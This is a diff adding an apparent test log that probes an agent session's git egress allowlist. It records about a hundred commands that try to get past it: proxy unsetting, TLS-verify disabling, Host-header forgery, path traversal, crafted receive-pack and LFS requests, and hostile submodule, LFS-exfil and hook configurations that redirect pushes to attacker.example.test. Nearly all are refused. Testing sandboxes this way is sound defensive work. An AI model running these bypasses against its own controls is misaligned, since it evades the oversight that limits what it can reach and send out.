@@ -1,0 +1,313 @@
+### setup rc=0
+$ git clone -q https://ghes.example.test/acme/widgets.git c 2>&1; cd c && git checkout -q -b lenny/e-1793731969 && echo x > e && git add e && git commit -qm e; git -C /tmp/tmp.x2fXT52SQJ/c log --oneline | wc -l
+15
+### proxy-unset rc=128
+$ env -u HTTPS_PROXY -u https_proxy -u HTTP_PROXY -u http_proxy git -c http.proxy= ls-remote https://ghes.example.test/acme/secret.git 2>&1
+fatal: unable to access 'http://ghes.example.test/acme/secret.git/': Could not resolve host: ghes.example.test
+### proxy-unset-curl-direct-ip rc=7
+$ env -u HTTPS_PROXY -u https_proxy -u HTTP_PROXY -u http_proxy curl -sS -m 6 -k -o /dev/null -w http=%{http_code} https://$ORIGIN_IP/acme/secret.git/info/refs?service=git-upload-pack 2>&1
+curl: (7) Failed to connect to 172.21.0.2 port 443 after 0 ms: Could not connect to server
+http=000
+### proxy-to-egress-reachable rc=0
+$ curl -sS -m 6 -o /dev/null -w http=%{http_code} --noproxy '*' -p -x http://gh-egress:3128 https://ghes.example.test/ 2>&1 | tail -1 | cut -c1-120
+http=000
+### proxy-to-egress-no-cred rc=128
+$ git -c http.proxy=http://gh-egress:3128 ls-remote https://ghes.example.test/acme/secret.git 2>&1
+fatal: unable to access 'http://ghes.example.test/acme/secret.git/': The requested URL returned error: 405
+### proxy-to-egress-bad-cred rc=128
+$ git -c http.proxy=http://agent:guess@gh-egress:3128 ls-remote https://ghes.example.test/acme/secret.git 2>&1
+fatal: unable to access 'http://ghes.example.test/acme/secret.git/': The requested URL returned error: 405
+### sslverify-false-outside rc=128
+$ git -c http.sslVerify=false ls-remote https://ghes.example.test/acme/secret.git 2>&1
+fatal: unable to access 'http://ghes.example.test/acme/secret.git/': The requested URL returned error: 403
+### sslverify-false-push-main rc=1
+$ git -c http.sslVerify=false push origin HEAD:refs/heads/main 2>&1
+fatal: the remote end hung up unexpectedly
+Everything up-to-date
+### git-ssl-no-verify-outside rc=128
+$ GIT_SSL_NO_VERIFY=1 git ls-remote https://ghes.example.test/acme/secret.git 2>&1
+fatal: unable to access 'http://ghes.example.test/acme/secret.git/': The requested URL returned error: 403
+### ssl-caInfo-swapped rc=128
+$ git -c http.sslCAInfo=/s/bundle.pem ls-remote https://ghes.example.test/acme/secret.git 2>&1
+fatal: unable to access 'http://ghes.example.test/acme/secret.git/': The requested URL returned error: 403
+### extraheader-auth-outside rc=128
+$ git -c 'http.extraHeader=Authorization: Bearer AGENT-OWN-TOKEN' ls-remote https://ghes.example.test/acme/secret.git 2>&1
+fatal: unable to access 'http://ghes.example.test/acme/secret.git/': The requested URL returned error: 403
+### extraheader-auth-inside rc=0
+$ git -c 'http.extraHeader=Authorization: Bearer AGENT-OWN-TOKEN' ls-remote https://ghes.example.test/acme/widgets.git 2>&1 | wc -l
+144
+### extraheader-basic-push-main rc=1
+$ git -c 'http.extraHeader=Authorization: Basic eC1hY2Nlc3MtdG9rZW46QUdFTlQtT1dOLVRPS0VO' push origin HEAD:refs/heads/main 2>&1
+fatal: the remote end hung up unexpectedly
+Everything up-to-date
+### extraheader-privatetoken rc=0
+$ git -c 'http.extraHeader=Private-Token: AGENT-OWN-TOKEN' ls-remote https://ghes.example.test/acme/widgets.git 2>&1 | wc -l
+144
+### extraheader-method-override rc=128
+$ git -c 'http.extraHeader=X-HTTP-Method-Override: GET' ls-remote https://ghes.example.test/acme/widgets.git 2>&1
+fatal: unable to access 'http://ghes.example.test/acme/widgets.git/': The requested URL returned error: 403
+### url-embedded-cred rc=0
+$ git ls-remote https://alice:AGENT-OWN-TOKEN@ghes.example.test/acme/widgets.git 2>&1 | wc -l
+144
+### host-differs-other rc=0
+$ curl -sS -m 12 -o /tmp/b -w http=%{http_code} --cacert /s/bundle.pem -x 127.0.0.1:3128 -H 'Host: other.example.test' 'https://ghes.example.test/acme/secret.git/info/refs?service=git-upload-pack' 2>&1; cat /tmp/b | cut -c1-120
+http=403{"message":"refused by the egress operation allowlist: authority differs inside a VCS host connection"}
+### host-differs-http11 rc=0
+$ curl -sS -m 12 -o /tmp/b -w http=%{http_code} --cacert /s/bundle.pem -x 127.0.0.1:3128 --http1.1 -H 'Host: other.example.test' 'https://ghes.example.test/acme/widgets.git/info/refs?service=git-upload-pack' 2>&1; cat /tmp/b | cut -c1-120
+http=403{"message":"refused by the egress operation allowlist: authority differs inside a VCS host connection"}
+### listener-origin-form rc=0
+$ curl -sS -m 6 -o /tmp/b -w http=%{http_code} 'http://127.0.0.1:3128/acme/secret.git/info/refs?service=git-upload-pack' 2>&1; cut -c1-100 /tmp/b
+http=400this endpoint is a proxy
+### listener-absolute-outside rc=0
+$ curl -sS -m 6 -o /tmp/b -w http=%{http_code} -x http://127.0.0.1:3128 'http://ghes.example.test/acme/secret.git/info/refs?service=git-upload-pack' 2>&1; cut -c1-100 /tmp/b
+http=403{"message":"refused by the egress operation allowlist: repository acme/secret is outside the session
+### listener-absolute-receive-advert rc=0
+$ curl -sS -m 6 -o /tmp/b -w http=%{http_code} -x http://127.0.0.1:3128 'http://ghes.example.test/acme/lib.git/info/refs?service=git-receive-pack' 2>&1; cut -c1-100 /tmp/b
+http=403{"message":"refused by the egress operation allowlist: repository acme/lib is outside the session's 
+### remove-rewrite-ghes rc=0
+$ GIT_CONFIG_GLOBAL=/dev/null GIT_SSL_CAINFO=/s/bundle.pem git ls-remote https://ghes.example.test/acme/widgets.git 2>&1 | tail -1
+fatal: unable to access 'https://ghes.example.test/acme/widgets.git/': The requested URL returned error: 403
+### remove-rewrite-github-private rc=0
+$ GIT_CONFIG_GLOBAL=/dev/null GIT_SSL_CAINFO=/s/bundle.pem git ls-remote https://github.com/acme/widgets.git 2>&1 | tail -1
+fatal: could not read Username for 'https://github.com': terminal prompts disabled
+### remove-rewrite-github-public rc=0
+$ GIT_CONFIG_GLOBAL=/dev/null GIT_SSL_CAINFO=/s/bundle.pem git ls-remote https://github.com/pub/lib.git 2>&1 | tail -1
+a35554173b51fcc953fd0f3b40652cc064c01711	refs/heads/main
+### remove-rewrite-github-own-token rc=0
+$ GIT_CONFIG_GLOBAL=/dev/null GIT_SSL_CAINFO=/s/bundle.pem git -c 'http.extraHeader=Authorization: Bearer AGENT-OWN-TOKEN' push -q https://github.com/agent/own.git HEAD:refs/heads/main 2>&1 | tail -1; git ls-remote https://github.com/pub/lib.git >/dev/null 2>&1; true
+hint: See the 'Note about fast-forwards' in 'git push --help' for details.
+### sslverify-false-github rc=0
+$ GIT_CONFIG_GLOBAL=/dev/null GIT_SSL_NO_VERIFY=1 git ls-remote https://github.com/pub/lib.git 2>&1 | tail -1
+a35554173b51fcc953fd0f3b40652cc064c01711	refs/heads/main
+### plain-curl-3128-inside rc=0
+$ curl -sS -m 8 -o /tmp/b -w http=%{http_code} -x http://127.0.0.1:3128 'http://ghes.example.test/acme/widgets.git/info/refs?service=git-upload-pack' 2>&1; head -c 30 /tmp/b | tr -d '\000'
+http=200001e# service=git-upload-pack
+### plain-curl-3129-inside rc=0
+$ curl -sS -m 8 -o /tmp/b -w http=%{http_code} -x http://127.0.0.1:3129 'http://ghes.example.test/acme/widgets.git/info/refs?service=git-upload-pack' 2>&1; head -c 30 /tmp/b | tr -d '\000'
+http=200001e# service=git-upload-pack
+### plain-curl-3129-outside rc=0
+$ curl -sS -m 8 -o /tmp/b -w http=%{http_code} -x http://127.0.0.1:3129 'http://ghes.example.test/acme/secret.git/info/refs?service=git-upload-pack' 2>&1; cut -c1-110 /tmp/b
+http=403{"message":"refused by the egress operation allowlist: repository acme/secret is outside the session's readabl
+### plain-curl-3129-receive-readonly rc=0
+$ curl -sS -m 8 -o /tmp/b -w http=%{http_code} -x http://127.0.0.1:3129 'http://ghes.example.test/acme/lib.git/info/refs?service=git-receive-pack' 2>&1; cut -c1-110 /tmp/b
+http=403{"message":"refused by the egress operation allowlist: repository acme/lib is outside the session's writable s
+### plain-host-differs rc=0
+$ curl -sS -m 8 -o /tmp/b -w http=%{http_code} -x http://127.0.0.1:3129 -H 'Host: other.example.test' 'http://ghes.example.test/acme/widgets.git/info/refs?service=git-upload-pack' 2>&1; cut -c1-110 /tmp/b
+http=400{"message":"refused by the egress operation allowlist: Host disagrees with the request target"}
+### plain-host-differs-reverse rc=0
+$ curl -sS -m 8 -o /tmp/b -w http=%{http_code} -x http://127.0.0.1:3129 -H 'Host: ghes.example.test' 'http://other.example.test/pub/lib.git/info/refs?service=git-upload-pack' 2>&1; cut -c1-110 /tmp/b
+http=400{"message":"refused by the egress operation allowlist: Host disagrees with the request target"}
+### plain-userinfo-host rc=0
+$ curl -sS -m 8 -o /tmp/b -w http=%{http_code} -x http://127.0.0.1:3129 'http://ghes.example.test@other.example.test/acme/widgets.git/info/refs?service=git-upload-pack' 2>&1; cut -c1-110 /tmp/b
+http=401
+### plain-upper-trailingdot rc=0
+$ curl -sS -m 8 -o /tmp/b -w http=%{http_code} -x http://127.0.0.1:3129 'http://GHES.EXAMPLE.TEST./acme/secret.git/info/refs?service=git-upload-pack' 2>&1; cut -c1-110 /tmp/b
+http=403{"message":"refused by the egress operation allowlist: repository acme/secret is outside the session's readabl
+### plain-other-port rc=0
+$ curl -sS -m 8 -o /tmp/b -w http=%{http_code} -x http://127.0.0.1:3129 'http://ghes.example.test:8443/acme/widgets.git/info/refs?service=git-upload-pack' 2>&1; cut -c1-110 /tmp/b
+http=502{"message":"refused by the egress operation allowlist: upstream failure"}
+### plain-nongit-path rc=0
+$ curl -sS -m 8 -o /tmp/b -w http=%{http_code} -x http://127.0.0.1:3129 'http://ghes.example.test/api/v3/user' 2>&1; cut -c1-110 /tmp/b
+http=403{"message":"refused by the egress operation allowlist: this listener serves smart HTTP only"}
+### plain-nongit-path-3128 rc=0
+$ curl -sS -m 8 -o /tmp/b -w http=%{http_code} -x http://127.0.0.1:3128 'http://ghes.example.test/api/v3/repos/acme/widgets/pulls/7/reviews' 2>&1; cut -c1-110 /tmp/b
+http=403{"message":"refused by the egress operation allowlist: GET /api/v3/repos/acme/widgets/pulls/7/reviews is not o
+### loopback-origin-form-outside rc=0
+$ curl -sS -m 8 -o /tmp/b -w http=%{http_code} 'http://127.0.0.1:3129/https/ghes.example.test/acme/secret.git/info/refs?service=git-upload-pack' 2>&1; cut -c1-110 /tmp/b
+http=403{"message":"refused by the egress operation allowlist: repository acme/secret is outside the session's readabl
+### loopback-origin-form-inside rc=0
+$ curl -sS -m 8 -o /tmp/b -w http=%{http_code} 'http://127.0.0.1:3129/https/ghes.example.test/acme/widgets.git/info/refs?service=git-upload-pack' 2>&1; head -c 30 /tmp/b | tr -d '\000'
+http=200001e# service=git-upload-pack
+### pushurl-other-host rc=0
+$ git -C /tmp/tmp.x2fXT52SQJ/c remote add pu https://ghes.example.test/acme/widgets.git; git -C /tmp/tmp.x2fXT52SQJ/c remote set-url --push pu https://attacker.example.test/x.git; git -C /tmp/tmp.x2fXT52SQJ/c remote -v | grep pu; git -C /tmp/tmp.x2fXT52SQJ/c push -q pu HEAD:refs/heads/lenny/pu 2>&1 | tail -1
+pu	http://attacker.example.test/x.git (push)
+fatal: unable to access 'http://attacker.example.test/x.git/': The requested URL returned error: 403
+### pushurl-outside-set rc=0
+$ git -C /tmp/tmp.x2fXT52SQJ/c remote set-url --push pu https://ghes.example.test/acme/secret.git; git -C /tmp/tmp.x2fXT52SQJ/c push -q pu HEAD:refs/heads/lenny/pu 2>&1 | tail -1; git -C /tmp/tmp.x2fXT52SQJ/c remote remove pu
+fatal: unable to access 'http://ghes.example.test/acme/secret.git/': The requested URL returned error: 403
+### explicit-http-remote rc=0
+$ git ls-remote http://ghes.example.test/acme/widgets.git 2>&1 | tail -1 | cut -c1-120
+81562c39c21f35be45d05c9f6f2597a2d79e4df3	refs/pull/7/head
+### explicit-http-unbound rc=0
+$ git ls-remote http://other.example.test/pub/lib.git 2>&1 | tail -1 | cut -c1-120
+a35554173b51fcc953fd0f3b40652cc064c01711	refs/heads/main
+### outside-clone rc=128
+$ git clone -q https://ghes.example.test/acme/secret.git ../s 2>&1
+fatal: unable to access 'http://ghes.example.test/acme/secret.git/': The requested URL returned error: 403
+### outside-push rc=128
+$ git push -q https://ghes.example.test/acme/secret.git HEAD:refs/heads/lenny/e 2>&1
+fatal: unable to access 'http://ghes.example.test/acme/secret.git/': The requested URL returned error: 403
+### readonly-push rc=128
+$ git push -q https://ghes.example.test/acme/lib.git HEAD:refs/heads/lenny/e 2>&1
+fatal: unable to access 'http://ghes.example.test/acme/lib.git/': The requested URL returned error: 403
+### path-case rc=128
+$ git ls-remote https://ghes.example.test/ACME/SECRET.git 2>&1
+fatal: unable to access 'http://ghes.example.test/ACME/SECRET.git/': The requested URL returned error: 403
+### path-no-dotgit rc=128
+$ git ls-remote https://ghes.example.test/acme/secret 2>&1
+fatal: unable to access 'http://ghes.example.test/acme/secret/': The requested URL returned error: 403
+### path-dotdot rc=0
+$ curl -sS -m 12 -o /tmp/b -w http=%{http_code} --cacert /s/bundle.pem -x 127.0.0.1:3128 --path-as-is 'https://ghes.example.test/acme/widgets.git/../secret.git/info/refs?service=git-upload-pack' 2>&1; cut -c1-110 /tmp/b
+http=403{"message":"refused by the egress operation allowlist: smart HTTP on a VCS host goes through the local git end
+### path-encoded-dotdot rc=0
+$ curl -sS -m 12 -o /tmp/b -w http=%{http_code} --cacert /s/bundle.pem -x 127.0.0.1:3128 --path-as-is 'https://ghes.example.test/acme/widgets.git/%2e%2e/secret.git/info/refs?service=git-upload-pack' 2>&1; cut -c1-110 /tmp/b
+http=403{"message":"refused by the egress operation allowlist: smart HTTP on a VCS host goes through the local git end
+### path-encoded-slash rc=0
+$ curl -sS -m 12 -o /tmp/b -w http=%{http_code} --cacert /s/bundle.pem -x 127.0.0.1:3128 'https://ghes.example.test/acme%2Fsecret.git/info/refs?service=git-upload-pack' 2>&1; cut -c1-110 /tmp/b
+http=403{"message":"refused by the egress operation allowlist: smart HTTP on a VCS host goes through the local git end
+### path-double-slash rc=0
+$ curl -sS -m 12 -o /tmp/b -w http=%{http_code} --cacert /s/bundle.pem -x 127.0.0.1:3128 --path-as-is 'https://ghes.example.test/acme//secret.git/info/refs?service=git-upload-pack' 2>&1; cut -c1-110 /tmp/b
+http=403{"message":"refused by the egress operation allowlist: smart HTTP on a VCS host goes through the local git end
+### curl-advert-outside rc=0
+$ curl -sS -m 12 -o /tmp/b -w http=%{http_code} --cacert /s/bundle.pem -x 127.0.0.1:3128 'https://ghes.example.test/acme/secret.git/info/refs?service=git-receive-pack' 2>&1; cut -c1-110 /tmp/b
+http=403{"message":"refused by the egress operation allowlist: smart HTTP on a VCS host goes through the local git end
+### curl-advert-inside rc=0
+$ curl -sS -m 12 -o /tmp/b -w http=%{http_code} --cacert /s/bundle.pem -x 127.0.0.1:3128 'https://ghes.example.test/acme/widgets.git/info/refs?service=git-upload-pack' 2>&1; head -c 30 /tmp/b | tr -d '\000'
+http=403{"message":"refused by the egr
+### curl-dumb-noquery rc=0
+$ curl -sS -m 12 -o /tmp/b -w http=%{http_code} --cacert /s/bundle.pem -x 127.0.0.1:3128 'https://ghes.example.test/acme/secret.git/info/refs' 2>&1; cut -c1-110 /tmp/b
+http=403{"message":"refused by the egress operation allowlist: smart HTTP on a VCS host goes through the local git end
+### curl-dumb-head rc=0
+$ curl -sS -m 12 -o /tmp/b -w http=%{http_code} --cacert /s/bundle.pem -x 127.0.0.1:3128 'https://ghes.example.test/acme/secret.git/HEAD' 2>&1; cut -c1-110 /tmp/b
+http=403{"message":"refused by the egress operation allowlist: smart HTTP on a VCS host goes through the local git end
+### curl-dumb-objects rc=0
+$ curl -sS -m 12 -o /tmp/b -w http=%{http_code} --cacert /s/bundle.pem -x 127.0.0.1:3128 'https://ghes.example.test/acme/widgets.git/objects/info/packs' 2>&1; cut -c1-110 /tmp/b
+http=403{"message":"refused by the egress operation allowlist: smart HTTP on a VCS host goes through the local git end
+### curl-two-services rc=0
+$ curl -sS -m 12 -o /tmp/b -w http=%{http_code} --cacert /s/bundle.pem -x 127.0.0.1:3128 'https://ghes.example.test/acme/lib.git/info/refs?service=git-upload-pack&service=git-receive-pack' 2>&1; cut -c1-110 /tmp/b
+http=403{"message":"refused by the egress operation allowlist: smart HTTP on a VCS host goes through the local git end
+### curl-case-service rc=0
+$ curl -sS -m 12 -o /tmp/b -w http=%{http_code} --cacert /s/bundle.pem -x 127.0.0.1:3128 'https://ghes.example.test/acme/lib.git/info/refs?service=GIT-RECEIVE-PACK' 2>&1; cut -c1-110 /tmp/b
+http=403{"message":"refused by the egress operation allowlist: smart HTTP on a VCS host goes through the local git end
+### curl-get-post-path rc=0
+$ curl -sS -m 12 -o /tmp/b -w http=%{http_code} --cacert /s/bundle.pem -x 127.0.0.1:3128 'https://ghes.example.test/acme/lib.git/git-receive-pack' 2>&1; cut -c1-110 /tmp/b
+http=403{"message":"refused by the egress operation allowlist: smart HTTP on a VCS host goes through the local git end
+### curl-post-ref-main rc=0
+$ curl -sS -m 12 -o /tmp/b -w http=%{http_code} --cacert /s/bundle.pem -x 127.0.0.1:3128 -H 'Content-Type: application/x-git-receive-pack-request' --data-binary @/tmp/p-main 'https://ghes.example.test/acme/widgets.git/git-receive-pack' 2>&1; cut -c1-110 /tmp/b
+http=403{"message":"refused by the egress operation allowlist: smart HTTP on a VCS host goes through the local git end
+### curl-post-ref-mixed rc=0
+$ curl -sS -m 12 -o /tmp/b -w http=%{http_code} --cacert /s/bundle.pem -x 127.0.0.1:3128 -H 'Content-Type: application/x-git-receive-pack-request' --data-binary @/tmp/p-mixed 'https://ghes.example.test/acme/widgets.git/git-receive-pack' 2>&1; cut -c1-110 /tmp/b
+http=403{"message":"refused by the egress operation allowlist: smart HTTP on a VCS host goes through the local git end
+### curl-post-delete rc=0
+$ curl -sS -m 12 -o /tmp/b -w http=%{http_code} --cacert /s/bundle.pem -x 127.0.0.1:3128 -H 'Content-Type: application/x-git-receive-pack-request' --data-binary @/tmp/p-del 'https://ghes.example.test/acme/widgets.git/git-receive-pack' 2>&1; cut -c1-110 /tmp/b
+http=403{"message":"refused by the egress operation allowlist: smart HTTP on a VCS host goes through the local git end
+### curl-post-shallow-prefix rc=0
+$ curl -sS -m 12 -o /tmp/b -w http=%{http_code} --cacert /s/bundle.pem -x 127.0.0.1:3128 -H 'Content-Type: application/x-git-receive-pack-request' --data-binary @/tmp/p-shallow 'https://ghes.example.test/acme/widgets.git/git-receive-pack' 2>&1; cut -c1-110 /tmp/b
+http=403{"message":"refused by the egress operation allowlist: smart HTTP on a VCS host goes through the local git end
+### curl-post-push-cert rc=0
+$ curl -sS -m 12 -o /tmp/b -w http=%{http_code} --cacert /s/bundle.pem -x 127.0.0.1:3128 -H 'Content-Type: application/x-git-receive-pack-request' --data-binary @/tmp/p-cert 'https://ghes.example.test/acme/widgets.git/git-receive-pack' 2>&1; cut -c1-110 /tmp/b
+http=403{"message":"refused by the egress operation allowlist: smart HTTP on a VCS host goes through the local git end
+### curl-post-dotdot-ref rc=0
+$ curl -sS -m 12 -o /tmp/b -w http=%{http_code} --cacert /s/bundle.pem -x 127.0.0.1:3128 -H 'Content-Type: application/x-git-receive-pack-request' --data-binary @/tmp/p-dots 'https://ghes.example.test/acme/widgets.git/git-receive-pack' 2>&1; cut -c1-110 /tmp/b
+http=403{"message":"refused by the egress operation allowlist: smart HTTP on a VCS host goes through the local git end
+### curl-post-extra-field rc=0
+$ curl -sS -m 12 -o /tmp/b -w http=%{http_code} --cacert /s/bundle.pem -x 127.0.0.1:3128 -H 'Content-Type: application/x-git-receive-pack-request' --data-binary @/tmp/p-extra 'https://ghes.example.test/acme/widgets.git/git-receive-pack' 2>&1; cut -c1-110 /tmp/b
+http=403{"message":"refused by the egress operation allowlist: smart HTTP on a VCS host goes through the local git end
+### curl-post-second-section rc=0
+$ curl -sS -m 12 -o /tmp/b -w http=%{http_code} --cacert /s/bundle.pem -x 127.0.0.1:3128 -H 'Content-Type: application/x-git-receive-pack-request' --data-binary @/tmp/p-twosec 'https://ghes.example.test/acme/widgets.git/git-receive-pack' 2>&1; cut -c1-110 /tmp/b
+http=403{"message":"refused by the egress operation allowlist: smart HTTP on a VCS host goes through the local git end
+### curl-post-gzip rc=0
+$ curl -sS -m 12 -o /tmp/b -w http=%{http_code} --cacert /s/bundle.pem -x 127.0.0.1:3128 -H 'Content-Type: application/x-git-receive-pack-request' -H 'Content-Encoding: gzip' --data-binary @/tmp/p-gz 'https://ghes.example.test/acme/widgets.git/git-receive-pack' 2>&1; cut -c1-110 /tmp/b
+http=403{"message":"refused by the egress operation allowlist: smart HTTP on a VCS host goes through the local git end
+### curl-post-chunked rc=0
+$ curl -sS -m 12 -o /tmp/b -w http=%{http_code} --cacert /s/bundle.pem -x 127.0.0.1:3128 -H 'Content-Type: application/x-git-receive-pack-request' -H 'Transfer-Encoding: chunked' --http1.1 --data-binary @/tmp/p-main 'https://ghes.example.test/acme/widgets.git/git-receive-pack' 2>&1; cut -c1-110 /tmp/b
+http=403{"message":"refused by the egress operation allowlist: smart HTTP on a VCS host goes through the local git end
+### plain-curl-post-ref-main rc=0
+$ curl -sS -m 8 -o /tmp/b -w http=%{http_code} -x http://127.0.0.1:${LIS:-3129} -H 'Content-Type: application/x-git-receive-pack-request' --data-binary @/tmp/p-main 'http://ghes.example.test/acme/widgets.git/git-receive-pack' 2>&1; cut -c1-110 /tmp/b
+http=403{"message":"refused by the egress operation allowlist: ref refs/heads/main is outside allowedRefPatterns; the 
+### plain-curl-post-delete rc=0
+$ curl -sS -m 8 -o /tmp/b -w http=%{http_code} -x http://127.0.0.1:${LIS:-3129} -H 'Content-Type: application/x-git-receive-pack-request' --data-binary @/tmp/p-del 'http://ghes.example.test/acme/widgets.git/git-receive-pack' 2>&1; cut -c1-110 /tmp/b
+http=403{"message":"refused by the egress operation allowlist: ref deletion of refs/heads/lenny/del refused"}
+### plain-curl-post-outside rc=0
+$ curl -sS -m 8 -o /tmp/b -w http=%{http_code} -x http://127.0.0.1:${LIS:-3129} -H 'Content-Type: application/x-git-receive-pack-request' --data-binary @/tmp/p-main 'http://ghes.example.test/acme/secret.git/git-receive-pack' 2>&1; cut -c1-110 /tmp/b
+http=403{"message":"refused by the egress operation allowlist: repository acme/secret is outside the session's writabl
+### plain-curl-post-dotdot-ref rc=0
+$ curl -sS -m 8 -o /tmp/b -w http=%{http_code} -x http://127.0.0.1:${LIS:-3129} -H 'Content-Type: application/x-git-receive-pack-request' --data-binary @/tmp/p-dots 'http://ghes.example.test/acme/widgets.git/git-receive-pack' 2>&1; cut -c1-110 /tmp/b
+http=403{"message":"refused by the egress operation allowlist: ref name \"refs/heads/lenny/../main\" refused"}
+### plain-curl-post-mixed rc=0
+$ curl -sS -m 8 -o /tmp/b -w http=%{http_code} -x http://127.0.0.1:${LIS:-3129} -H 'Content-Type: application/x-git-receive-pack-request' --data-binary @/tmp/p-mixed 'http://ghes.example.test/acme/widgets.git/git-receive-pack' 2>&1; cut -c1-110 /tmp/b
+http=403{"message":"refused by the egress operation allowlist: ref refs/heads/main is outside allowedRefPatterns; the 
+### plain-curl-post-gzip rc=0
+$ curl -sS -m 8 -o /tmp/b -w http=%{http_code} -x http://127.0.0.1:${LIS:-3129} -H 'Content-Type: application/x-git-receive-pack-request' -H 'Content-Encoding: gzip' --data-binary @/tmp/p-gz 'http://ghes.example.test/acme/widgets.git/git-receive-pack' 2>&1; cut -c1-110 /tmp/b
+http=415{"message":"refused by the egress operation allowlist: compressed receive-pack body refused: commands must be 
+### curl-post-wrong-ct rc=0
+$ curl -sS -m 12 -o /tmp/b -w http=%{http_code} --cacert /s/bundle.pem -x 127.0.0.1:3128 -H 'Content-Type: application/octet-stream' --data-binary @/tmp/p-main 'https://ghes.example.test/acme/widgets.git/git-receive-pack' 2>&1; cut -c1-110 /tmp/b
+http=403{"message":"refused by the egress operation allowlist: smart HTTP on a VCS host goes through the local git end
+### curl-upload-pack-on-outside rc=0
+$ curl -sS -m 12 -o /tmp/b -w http=%{http_code} --cacert /s/bundle.pem -x 127.0.0.1:3128 -H 'Content-Type: application/x-git-upload-pack-request' --data-binary 0000 'https://ghes.example.test/acme/secret.git/git-upload-pack' 2>&1; cut -c1-110 /tmp/b
+http=403{"message":"refused by the egress operation allowlist: smart HTTP on a VCS host goes through the local git end
+### lfs-upload-on-readonly rc=0
+$ curl -sS -m 12 -o /tmp/b -w http=%{http_code} --cacert /s/bundle.pem -x 127.0.0.1:3128 -H 'Content-Type: application/vnd.git-lfs+json' -d '{"operation":"upload","objects":[{"oid":"aa","size":1}]}' 'https://ghes.example.test/acme/lib.git/info/lfs/objects/batch' 2>&1; cut -c1-110 /tmp/b
+http=403{"message":"refused by the egress operation allowlist: smart HTTP on a VCS host goes through the local git end
+### lfs-duplicate-operation rc=0
+$ curl -sS -m 12 -o /tmp/b -w http=%{http_code} --cacert /s/bundle.pem -x 127.0.0.1:3128 -H 'Content-Type: application/vnd.git-lfs+json' -d '{"operation":"download","operation":"upload","objects":[]}' 'https://ghes.example.test/acme/lib.git/info/lfs/objects/batch' 2>&1; cut -c1-110 /tmp/b
+http=403{"message":"refused by the egress operation allowlist: smart HTTP on a VCS host goes through the local git end
+### lfs-case-operation rc=0
+$ curl -sS -m 12 -o /tmp/b -w http=%{http_code} --cacert /s/bundle.pem -x 127.0.0.1:3128 -H 'Content-Type: application/vnd.git-lfs+json' -d '{"Operation":"upload","operation":"download","objects":[]}' 'https://ghes.example.test/acme/lib.git/info/lfs/objects/batch' 2>&1; cut -c1-110 /tmp/b
+http=403{"message":"refused by the egress operation allowlist: smart HTTP on a VCS host goes through the local git end
+### lfs-outside rc=0
+$ curl -sS -m 12 -o /tmp/b -w http=%{http_code} --cacert /s/bundle.pem -x 127.0.0.1:3128 -H 'Content-Type: application/vnd.git-lfs+json' -d '{"operation":"download","objects":[]}' 'https://ghes.example.test/acme/secret.git/info/lfs/objects/batch' 2>&1; cut -c1-110 /tmp/b
+http=403{"message":"refused by the egress operation allowlist: smart HTTP on a VCS host goes through the local git end
+### lfs-locks-on-readonly rc=0
+$ curl -sS -m 12 -o /tmp/b -w http=%{http_code} --cacert /s/bundle.pem -x 127.0.0.1:3128 -H 'Content-Type: application/vnd.git-lfs+json' -d '{}' 'https://ghes.example.test/acme/lib.git/info/lfs/locks' 2>&1; cut -c1-110 /tmp/b
+http=403{"message":"refused by the egress operation allowlist: smart HTTP on a VCS host goes through the local git end
+### token-trace rc=1
+$ GIT_TRACE_CURL=1 GIT_CURL_VERBOSE=1 git ls-remote https://ghes.example.test/acme/widgets.git 2>&1 | grep -ac 'MINT-'
+0
+### token-reflected rc=1
+$ curl -sS -m 12 -o /tmp/b -w http=%{http_code} --cacert /s/bundle.pem -x 127.0.0.1:3128 -D /tmp/hd 'https://ghes.example.test/acme/reflect.git/info/refs?service=git-upload-pack' 2>&1; cat /tmp/b; grep -i x-reflect /tmp/hd
+http=403{"message":"refused by the egress operation allowlist: smart HTTP on a VCS host goes through the local git endpoint"}
+### redirect-in-scope rc=0
+$ git ls-remote https://ghes.example.test/acme/moved.git 2>&1 | wc -l
+145
+### redirect-out-of-scope rc=128
+$ git ls-remote https://ghes.example.test/acme/evilredir.git 2>&1
+fatal: unable to access 'http://ghes.example.test/acme/evilredir.git/': The requested URL returned error: 403
+### hostile-submodules rc=1
+$ cd /tmp/tmp.x2fXT52SQJ; timeout 30 git clone -q --recurse-submodules https://ghes.example.test/acme/hostile.git h 2>&1 | tail -4; for s in out evil; do printf '%s ' $s; git -C h/$s rev-parse --show-toplevel 2>/dev/null | grep -c /$s$; done
+out 0
+evil 0
+### hostile-lfsconfig rc=0
+$ cd /tmp/tmp.x2fXT52SQJ/h 2>/dev/null && git lfs install --local >/dev/null 2>&1; git lfs env 2>/dev/null | grep -i '^Endpoint' | cut -c1-90; printf 'version https://git-lfs.github.com/spec/v1\noid sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\nsize 1\n' > p; git lfs smudge < p 2>&1 | tail -1 | cut -c1-160
+Endpoint=http://other.example.test/lfs-exfil (auth=none)
+Use `git lfs logs last` to view the log.
+### hook-first-push rc=0
+$ git push -q origin HEAD 2>&1; git config --local --list | grep -E 'proxy|sslverify|attacker' | head -4
+http.sslverify=false
+url.https://attacker.example.test/.insteadof=https://ghes.example.test/
+### hook-next-fetch rc=128
+$ git fetch origin 2>&1
+fatal: unable to access 'http://attacker.example.test/x.git/': Could not resolve host: attacker.example.test
+### hook-config-exfil-allowed-host rc=128
+$ git -c http.proxy=127.0.0.1:3128 push -q https://other.example.test/agent/own.git HEAD:refs/heads/x 2>&1
+fatal: unable to access 'http://other.example.test/agent/own.git/': The requested URL returned error: 403
+### attacker-direct rc=128
+$ git ls-remote https://attacker.example.test/x.git 2>&1
+fatal: unable to access 'http://attacker.example.test/x.git/': The requested URL returned error: 403
+### arb-host-public-clone rc=0
+$ git clone -q https://other.example.test/pub/lib.git a 2>&1; git -C a log --oneline 2>/dev/null | wc -l
+6
+### arb-host-own-token-push rc=128
+$ git -C c config --unset-all --local url.https://attacker.example.test/.insteadof; git -C c remote set-url origin https://ghes.example.test/acme/widgets.git; git -C c config --local --unset http.proxy; git -C c -c 'http.extraHeader=Authorization: Bearer AGENT-OWN-TOKEN' push -q https://other.example.test/agent/own.git HEAD:refs/heads/main 2>&1
+fatal: unable to access 'http://other.example.test/agent/own.git/': The requested URL returned error: 403
+### fronting-connect-unbound-host-ghes rc=0
